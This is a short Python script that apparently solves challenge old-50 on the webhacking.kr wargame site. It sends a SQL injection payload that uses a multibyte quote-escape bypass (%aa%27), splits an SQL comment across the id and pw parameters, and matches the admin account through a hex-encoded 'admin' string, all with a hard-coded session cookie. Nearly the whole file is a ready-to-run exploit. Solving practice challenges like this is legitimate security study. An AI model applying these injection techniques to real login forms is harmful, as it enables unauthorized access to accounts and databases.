import requests

url = "https://webhacking.kr/challenge/web-22/?"
cookie = {'PHPSESSID':'g2bqkv25tsertrgadqjcalkv1q'}

def solve():
    query = "id=%aa%27/*&pw=*/%20or%20id%20like%200x61646d696e%23"
    res = requests.get(url=url+query, cookies=cookie)
    if "old-50 Pwned!" in res.text:
        print("old-50 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()

